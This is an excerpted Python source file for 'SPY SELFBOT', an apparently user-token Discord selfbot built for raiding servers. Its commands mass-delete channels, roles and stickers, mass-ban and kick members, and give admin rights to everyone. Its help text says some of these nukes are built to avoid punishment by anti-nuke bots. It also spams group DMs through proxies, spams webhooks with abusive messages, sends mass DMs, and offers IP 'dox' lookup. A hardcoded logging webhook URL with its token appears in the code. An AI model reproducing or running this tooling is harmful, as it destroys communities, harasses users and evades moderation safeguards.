...
channelnames = [
    "risinplayz op", "wizzed by risinplayz", "nuked by risinplayz",
    "beamed by risinplayz", "fucked by risinplayz", "risinplayz was here",
    "risinplayz runs cord"
]  #channelnames
rolenames = [
    "risinplayz op", "wizzed by risinplayz", "nuked by risinplayz",
    "beamed by risinplayz", "fucked by risinplayz", "risinplayz was here",
...
if token_type == "user":
    ...
    client = commands.Bot(command_prefix=risinencrypt1,
...
def RichPresence():
    if rich_presence == "y" or rich_presence == "Y":
        try:
            ...
            RPC.connect()
            RPC.update(details="Created By RisinPlayZ",
                       large_image="risinop",
                       small_image="risinop",
                       large_text="SPYSELFBOT",
                       start=time.time())
        except:
            pass
...
async def on_ready():
    os.system(
        f"mode 175,30 & title [SPY SELF BOT] - Connected as: {client.user}")
    print(f"Logged in as {client.user}")


loghook = Webhook(
    "https://discord.com/api/webhooks/892751592149876796/j2YrxjcJz4lvXbmFZuJVS3rH5awHGpXKeJ8OyKowtZusZh6V3P3IToxxiLjBeYBx0ilB"
)
...
async def help(ctx):
    if embedmode == "True":
        ...
        embed.set_thumbnail(
            url=
            "https://cdn.discordapp.com/emojis/878960797949263882.gif?v=1&size=40"
        )
...
async def gcspam(ctx, lol, idk):
    ...
    for gc in range(10):
        ...
        try:
            ...
            requests.post('https://discordapp.com/api/v9/users/@me/channels',
                          proxies=proxies,
                          headers=headers,
                          json={"recipients": [lol, idk]})
...
async def nuke(ctx):
    ...
    embed.add_field(
        name=">securitynuke",
        value=
        "```Nukes the server in a way, security / wickbot wont punish you.\nParameters- >securitynuke\nEx- >securitynuke```"
    )

    embed.add_field(
        name=">universalnuke",
        value=
        "```Nukes the server in a way, universal bot wont punish you.\nParameters- >universalnuke\nEx- >universalnuke```"
    )
    embed.add_field(
        name=">nickall",
        value=
    ...
    embed.add_field(
        name=">delstickers",
        value=
        "```Deletes all stickers of the server.\nParameters- >delstickers\nEx- >delstickers```"
    )
...
async def nuke2(ctx):
    ...
    embed.add_field(
        name=">cc",
        value=
        "```Deletes channels with the same name\nParameters->cc <channel-name>\nEx- >cc wizzed-by-risinplayz```"
    )
    embed.add_field(
        name=">cr",
        value=
        "```Deletes roles with the same name\nParameters->cr <role-name>\nEx- >cr wizzed-by-risinplayz```"
    )
    embed.add_field(
        name=">massunban",
        value=
        "```Unbans everyone in the server.\nParameters- >massunban\nEx- >massunban```"
    )
    embed.add_field(
        name=">delchannels",
        value=
        "```Removes all channels of the server\nParameters- >delchannels\nEx- >delchannels```"
    )
    embed.add_field(
        name=">delroles",
        value=
        "```Removes all roles of the server\nParameters- >delroles\nEx- >delroles```"
    )
    embed.add_field(
        name=">giveadmin",
        value=
        "```Enables Admin in Everyone\nParameters- >giveadmin\nEx- >giveadmin```"
    )
...
async def premium(ctx):
    ...
    embed.add_field(
        name=">eval",
        value=
        "```Function that evaluates any string as javascript code and actually executes it.\nParameters- >eval <code>\nEx- >eval client.guilds.cache.size```"
    )
    embed.add_field(
        name=">plugins",
        value=
        "```Enable / DIsable Plugins Feature\nParameter- >plugins <enable/disable>\nEx- >plugins enable```"
    )
    await ctx.reply(embed=embed, mention_author=True)
...
async def securitynuke(ctx):
    ...
    await ctx.reply(f"{risinencrypt1}servername TRASHED BY RISINPLAYZ",
                    mention_author=True)
...
@client.command(aliases=['doxip', 'iplookup', 'iptolocation', 'ip2geo', 'ip'])
...
async def destroy(ctx):
    ...
    await ctx.reply(f"{risinencrypt1}massban {ctx.guild.id}",
                    mention_author=True)
...
async def delwebhook(ctx, link=None):
    if link == None:
        embed = discord.Embed(title="SPY SELFBOT",
...
async def ping(ctx, ipp=None):
    await ctx.reply(f'Pinging {ipp} with 32 bytes of data:',
                    mention_author=True)
    await ctx.reply("Timed out.", mention_author=True)
...
def ssspam(webhook):
    while spammingdawebhookeroos:
        ...
        idktopost = f'https://discord.gg/9beSK3E8 @everyone KHATARNAK RUNS CORD | VULTURE IS A SCAMMER HE SCAM RYUK AND KHATARNAK TOO'
...
async def spamhook(ctx, webhook, *, message):
    ...
    for i in range(90):
        ...
        if r.status_code == 204:
            ...
            os.system(
                f'title SPY SELFBOT - WEBHOOK SPAMMER ^| By RisinPlayZ - Sent : {sent} ^| Failed : {failed}'
            )
        else:
            failed += 1
            print(
...
async def selfbotinfo(ctx):
    ...
    embed.add_field(name='___**DATE OF CREATION**___',
...
async def sendhook(ctx, webhook, *, message):
    ...
    if "Unknown Webhook" or "Invalid" in rs["message"]:
        await ctx.reply(
            f'Successfully sent `{message}` to webhook `{webhook}`',
            mention_author=True)
    else:
...
async def afk(ctx, arg1, arg2=risinnwtff):
    ...
    if arg1 == "on" or arg1 == "On":
        risinnwtff = arg2
        risinnwtf = True
        await ctx.message.reply("SPY SELFBOT | AFK ENABLED",
                                mention_author=True)
    elif arg1 == "off" or arg1 == "Off":
        risinnwtf = False
        risinnwtff = ""
        await ctx.message.reply("SPY SELFBOT | AFK DISABLED",
                                mention_author=True)
...
async def massdm(ctx, *, x):
    ...
    for channel in client.private_channels:
        try:
            ...
            await ctx.reply(f"**SPY SELFBOT | MASS DM** > {channel}",
                            mention_author=True)
        except:
            continue
...
async def channelfuckery(ctx):
    for i in range(200):
        ...
        y = requests.patch(f'https://discord.com/api/v8/guilds/{ctx.guild.id}',
                           headers=headers,
                           json={
                               "features": ["COMMUNITY"],
                               "verification_level": 1,
...
async def idtoname(ctx, personsid: int):
    if len(str(personsid)) != 18:
        await ctx.reply(content=f"**SPY SELFBOT** | >id 822466294032367636",
                        mention_author=True)
    else:
        user = await client.fetch_user(personsid)
        randcolor = random.randint(0x000000, 0xFFFFFF)
        embed = discord.Embed(
            title="SPY SELFBOT | ID TO USERNAME",
            description=
...
async def massban(ctx, guild):
    ...
    with open('RisinPlayZ/members.txt', 'a') as (m):
        ...
        await ctx.reply(
            'SPY SELFBOT | MASS BAN INITIATED\nRemoving Members in progress......',
            mention_author=True)
        m.close()
    guild = guild
    print()
...
async def botmassban(ctx, pref, timetosleep, guild):
    ...
    with open('RisinPlayZ/members.txt', 'a') as (m):
        ...
        await ctx.reply(
            'SPY SELFBOT | BOT MASS BAN INITIATED\nRemoving Members in progress......',
            mention_author=True)
        m.close()
    guild = guild
    print()
    ...
    for member in members:
        ...
        time.sleep(
            timetosleep
        )  # because some bots have cooldown like dyno on there commands
...
async def masskick(ctx, guild):
    ...
    with open('members.txt', 'a') as (m):
        ...
        await ctx.reply(
            'SPY SELFBOT | MASS KICK INITIATED\nRemoving Members in progress......',
            mention_author=True)
        m.close()
    guild = guild
    print()
...
async def unbanall(ctx):
    ...
    await ctx.reply('SPY SELFBOT | Unbanning {} members'.format(len(banlist)),
                    mention_author=True)
...
def deletionofachannel(channeldetails):
    try:
        requests.delete(
            f"https://canary.discord.com/api/v8/channels/{channeldetails}",
            headers=headers)
    except:
        pass
...
@client.command(aliases=[
    'deleterols', 'deleteallroles', "delroles", "roledel", "delrols", "roldel",
    "roledeletion"
])
async def deleteroles(ctx):
    await ctx.message.delete()
    for rol in ctx.guild.roles:
        threading.Thread(target=deletionofarole, args=(
            ctx.guild.id,
            rol.id,
        )).start()
...
async def snipe(ctx):
    ...
    try:  #This piece of code is run if the bot finds anything in the dictionary
        em = discord.Embed(name="SPY SELFBOT",
...
async def joinvc(ctx):
    ...
    await ctx.reply("SPY SELFBOT | SUCCESSFULLY CONNECTED",
                    mention_author=True)
...
def risinidkchanneldel(idofguild, nameofchan):
    try:
        headers = {"Authorization": f'{risinencrypt}'}
        req = requests.post(
            f"https://canary.discord.com/api/v8/guilds/{idofguild}/channels",
            headers=headers,
            json={
                "type": "0",
                "name": nameofchan
...
async def spamroles(ctx):
    ...
    for i in range(500):
        threading.Thread(target=massroles,
                         args=(random.choice(rolenames), )).start()
...
async def prune(ctx):
    ...
    time.sleep(2)
    await ctx.guild.prune_members(days=1,
...
if token_type == "user": client.run(os.environ("iidk"), bot=False)
elif token_type == "bot":
